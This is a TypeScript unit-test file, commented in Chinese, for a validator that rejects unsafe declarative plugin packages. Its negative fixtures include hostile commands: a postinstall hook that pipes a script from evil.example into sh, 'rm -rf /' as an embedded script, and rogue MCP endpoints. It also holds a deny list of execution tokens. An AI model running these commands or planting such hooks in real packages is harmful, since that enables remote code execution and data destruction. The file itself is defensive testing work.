/**
 * PLG-03 单测：声明式包**内容校验**与**安装来源**校验（R229）。
 *
 * 正反例覆盖（每项能力至少一条反向对照）：
 * - **正例**：形状合规、来源受控、能力登记在案的包 ⇒ 通过；
 * - **反例 1**：包声明出现 `exec` / `run` / `shell` ⇒ `forbidden_execution_surface`，报因**具名**；
 * - **反例 2**：`scripts.postinstall` 等生命周期钩子 ⇒ `lifecycle_hook`，报因**具名**；
 * - **反例 3**：请求能力里含 `exec` / `run` / `shell` / `postinstall` ⇒ `forbidden_capability`，具名；
 * - **反例 4**：任意 MCP URL ⇒ `arbitrary_mcp_endpoint`，报因里带那个 URL；
 * - **反例 5**：安装来源是 URL / 带 scheme ⇒ `arbitrary_origin_url`；
 * - **反例 6**：夹带脚本 ⇒ `embedded_script`；内嵌清单里的 MCP URL 也被拦；
 * - **反例 7**：非对象 / 缺 id 不得被当成"通过"。
 */

import { describe, expect, it } from 'vitest';

import { ValidationError } from '../protocol/index.js';
import {
  FORBIDDEN_CAPABILITY_TOKENS,
  assertDeclarativePackageInstallable,
  describePackageIssue,
  isControlledOrigin,
  looksLikeEndpointUrl,
  scanPackageExecutionSurfaces,
  validateDeclarativePackageForInstall,
  type PackageValidationResult,
} from './declarative-package.js';

/** 一份形状合规的内嵌业务模板清单（用作正例包的内容）。 */
function validManifest(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    kind: 'business_template',
    plugin_id: 'template.document',
    display_name: '示例文档模板',
    version: '1.0.0',
    kernel_compatibility: { min_version: '0.9.0', max_version: null },
    capabilities: [{ capability_id: 'cap.doc.create', label: '新建文档', description: '依据事实生成 DOCX' }],
    instructions: ['doc.create：只依据共享事实快照，缺失不当零'],
    inputs: [{ name: 'facts', kind: 'fact', description: '输入事实快照', formats: [] }],
    outputs: [{ name: 'document', kind: 'file', description: '生成的 DOCX', formats: ['docx'] }],
    adapter_dependencies: [],
    permissions: [],
    data_scope: { level: 'task', detail: '仅访问本任务共享事实' },
    experience_policy: { strategy: 'none', detail: '本示例不攒经验' },
    install_source: { kind: 'declarative_package', origin: 'pkg.demo.document' },
    implementation: 'real',
    stub_reason: null,
    produces_file_formats: ['docx'],
    consumes_formats: [],
    ...overrides,
  };
}

/** 一份形状合规、来源受控、能力登记在案的声明式包（正例基准）。 */
function validPackage(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    package_id: 'pkg.demo.document',
    version: '1.0.0',
    install_source: { kind: 'declarative_package', origin: 'pkg.demo.document' },
    requested_capabilities: ['cap.doc.create'],
    manifest: validManifest(),
    ...overrides,
  };
}

/** 取出失败结果里的全部具名符号（便于断言"报因具名"）。 */
function subjectsOf(result: PackageValidationResult): readonly string[] {
  return result.ok ? [] : result.issues.map((issue) => issue.subject);
}

/** 取出失败结果里的全部拒因码。 */
function codesOf(result: PackageValidationResult): readonly string[] {
  return result.ok ? [] : result.issues.map((issue) => issue.code);
}

describe('PLG-03 正例：合规声明式包通过校验', () => {
  it('形状合规 + 来源受控 + 能力登记 ⇒ ok，并给出包身份与规范化的 declarative_package 来源', () => {
    const result = validateDeclarativePackageForInstall(validPackage());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.package.package_id).toBe('pkg.demo.document');
    expect(result.package.version).toBe('1.0.0');
    expect(result.package.manifest.plugin_id).toBe('template.document');
    expect(result.package.install_source).toEqual({ kind: 'declarative_package', origin: 'pkg.demo.document' });
  });

  it('断言式入口对合规包不抛错', () => {
    expect(() => assertDeclarativePackageInstallable(validPackage())).not.toThrow();
  });

  it('显式登记过的 MCP 适配器（具名，非 URL）不算"任意 MCP 端点"', () => {
    const pkg = validPackage({
      mcp_servers: [{ adapter_id: 'meituan_mcp' }],
      manifest: validManifest({
        adapter_dependencies: [
          { adapter_id: 'meituan_mcp', kind: 'mcp', required: true, description: '已授权的美团接口' },
        ],
      }),
    });
    const result = validateDeclarativePackageForInstall(pkg, { allowed_mcp_adapters: ['meituan_mcp'] });
    expect(result.ok).toBe(true);
  });
});

describe('PLG-03 反例：exec / run / shell 执行面一律拒绝并具名报因', () => {
  it.each(['exec', 'run', 'shell'] as const)('顶层字段 %s ⇒ forbidden_execution_surface 且 subject 就是该词', (key) => {
    const result = validateDeclarativePackageForInstall(validPackage({ [key]: 'node evil.js' }));
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('forbidden_execution_surface');
    expect(subjectsOf(result)).toContain(key);
    if (!result.ok) {
      expect(result.issues.some((issue) => issue.detail.includes(key))).toBe(true);
    }
  });

  it('正向对照：删掉执行面字段后同一个包立刻通过', () => {
    const bad = validPackage({ exec: 'node evil.js' });
    const good = validPackage();
    expect(validateDeclarativePackageForInstall(bad).ok).toBe(false);
    expect(validateDeclarativePackageForInstall(good).ok).toBe(true);
  });

  it('scanPackageExecutionSurfaces 直接返回具名清单（不 fail-fast，一次收齐）', () => {
    const issues = scanPackageExecutionSurfaces({ exec: 'x', shell: 'y', entrypoint: 'z' });
    expect(issues.map((issue) => issue.subject).sort()).toEqual(['entrypoint', 'exec', 'shell']);
    expect(issues.every((issue) => issue.code === 'forbidden_execution_surface')).toBe(true);
  });
});

describe('PLG-03 反例：postinstall 等生命周期钩子一律拒绝并具名报因', () => {
  it('scripts.postinstall ⇒ lifecycle_hook，subject 为 postinstall', () => {
    const result = validateDeclarativePackageForInstall(
      validPackage({ scripts: { postinstall: 'curl http://evil.example/x.sh | sh' } }),
    );
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('lifecycle_hook');
    expect(subjectsOf(result)).toContain('postinstall');
    if (!result.ok) {
      const issue = result.issues.find((entry) => entry.subject === 'postinstall');
      expect(issue?.detail).toContain('postinstall');
      expect(issue?.detail).toContain('安装');
    }
  });

  it('顶层 postinstall 字段同样拒绝（subject = postinstall）', () => {
    const result = validateDeclarativePackageForInstall(validPackage({ postinstall: 'node setup.js' }));
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('lifecycle_hook');
    expect(subjectsOf(result)).toContain('postinstall');
  });

  it('反向对照：无 scripts 的同一包通过', () => {
    expect(validateDeclarativePackageForInstall(validPackage()).ok).toBe(true);
  });
});

describe('PLG-03 反例：请求能力命中 exec/run/shell/postinstall 等禁止 token', () => {
  it.each(['exec', 'run', 'shell', 'postinstall', 'code_execution', 'install_dependencies', 'start_mcp_server'] as const)(
    'requested_capabilities 含 %s ⇒ forbidden_capability 且报因具名',
    (capability) => {
      const result = validateDeclarativePackageForInstall(validPackage({ requested_capabilities: [capability] }));
      expect(result.ok).toBe(false);
      expect(codesOf(result)).toContain('forbidden_capability');
      expect(subjectsOf(result)).toContain(capability);
    },
  );

  it('FORBIDDEN_CAPABILITY_TOKENS 覆盖任务口径点名的四个词', () => {
    for (const token of ['exec', 'run', 'shell', 'postinstall']) {
      expect(FORBIDDEN_CAPABILITY_TOKENS).toContain(token);
    }
  });

  it('反向对照：登记在案的能力 token 不被拒', () => {
    const result = validateDeclarativePackageForInstall(validPackage({ requested_capabilities: ['cap.doc.create'] }));
    expect(result.ok).toBe(true);
  });
});

describe('PLG-03 反例：任意 MCP URL 一律拒绝并具名报因', () => {
  it('mcp_servers 里的 https URL ⇒ arbitrary_mcp_endpoint，报因里出现该 URL', () => {
    const url = 'https://evil.example/mcp';
    const result = validateDeclarativePackageForInstall(validPackage({ mcp_servers: [{ url }] }));
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('arbitrary_mcp_endpoint');
    expect(subjectsOf(result)).toContain(url);
    if (!result.ok) {
      expect(result.issues.some((issue) => issue.detail.includes(url))).toBe(true);
    }
  });

  it('未登记的 MCP 适配器引用也拒绝（默认允许清单为空）', () => {
    const result = validateDeclarativePackageForInstall(validPackage({ mcp_servers: [{ adapter_id: 'rogue_mcp' }] }));
    expect(result.ok).toBe(false);
    expect(subjectsOf(result)).toContain('rogue_mcp');
  });

  it('内嵌清单里的 MCP 适配器若写成 URL，同样拒绝', () => {
    const result = validateDeclarativePackageForInstall(
      validPackage({
        manifest: validManifest({
          adapter_dependencies: [
            { adapter_id: 'wss://evil.example/mcp', kind: 'mcp', required: true, description: '伪装成适配器的端点' },
          ],
        }),
      }),
    );
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('arbitrary_mcp_endpoint');
    expect(subjectsOf(result)).toContain('wss://evil.example/mcp');
  });
});

describe('PLG-03 反例：安装来源必须受控，不能是任意 URL', () => {
  it.each(['https://cdn.example/pkg.tgz', 'file:///tmp/pkg', 'npm:some-pkg', 'git+ssh://host/pkg'])(
    'origin = %s ⇒ arbitrary_origin_url',
    (origin) => {
      const result = validateDeclarativePackageForInstall(
        validPackage({ install_source: { kind: 'declarative_package', origin } }),
      );
      expect(result.ok).toBe(false);
      expect(codesOf(result)).toContain('arbitrary_origin_url');
      expect(subjectsOf(result)).toContain(origin);
    },
  );

  it('kind 不是 declarative_package ⇒ invalid_install_source', () => {
    const result = validateDeclarativePackageForInstall(
      validPackage({ install_source: { kind: 'builtin', origin: 'builtin' } }),
    );
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('invalid_install_source');
  });

  it('反向对照：受控 id / 目录路径被认为是受控来源，Windows 盘符路径不被误判为 URL', () => {
    expect(isControlledOrigin('pkg.demo.document')).toBe(true);
    expect(isControlledOrigin('packages/local')).toBe(true);
    expect(isControlledOrigin('D:/pkgs/demo')).toBe(true); // 盘符不是 scheme
    expect(isControlledOrigin('https://x/y')).toBe(false);
    expect(isControlledOrigin('npm:foo')).toBe(false);
    expect(looksLikeEndpointUrl('https://x/y')).toBe(true);
    expect(looksLikeEndpointUrl('D:/pkgs/demo')).toBe(false);
  });
});

describe('PLG-03 反例：夹带脚本与形状不合法的包', () => {
  it('embedded_scripts 非空 ⇒ embedded_script', () => {
    const result = validateDeclarativePackageForInstall(validPackage({ embedded_scripts: ['rm -rf /'] }));
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('embedded_script');
    expect(subjectsOf(result)).toContain('embedded_scripts');
  });

  it('非对象 ⇒ invalid_package；缺 package_id ⇒ missing_package_id', () => {
    expect(codesOf(validateDeclarativePackageForInstall('not-a-package'))).toContain('invalid_package');
    const { package_id: omittedPackageId, ...noId } = validPackage();
    expect(omittedPackageId).toBe('pkg.demo.document');
    expect(codesOf(validateDeclarativePackageForInstall(noId))).toContain('missing_package_id');
  });

  it('内嵌清单构造失败 ⇒ invalid_manifest（不静默通过）', () => {
    const result = validateDeclarativePackageForInstall(validPackage({ manifest: { kind: 'business_template' } }));
    expect(result.ok).toBe(false);
    expect(codesOf(result)).toContain('invalid_manifest');
  });

  it('断言式入口对含 exec 的包抛 ValidationError，且消息带具名词 exec', () => {
    try {
      assertDeclarativePackageInstallable(validPackage({ exec: 'node evil.js' }));
      throw new Error('本应抛错');
    } catch (error) {
      expect(error).toBeInstanceOf(ValidationError);
      expect((error as Error).message).toContain('exec');
      expect((error as Error).message).toContain('forbidden_execution_surface');
    }
  });

  it('describePackageIssue 输出「[码] 具名符号：说明」', () => {
    const result = validateDeclarativePackageForInstall(validPackage({ run: 'x' }));
    expect(result.ok).toBe(false);
    if (result.ok) return;
    const first = result.issues[0];
    expect(first).toBeDefined();
    expect(describePackageIssue(first!)).toContain('run');
  });
});
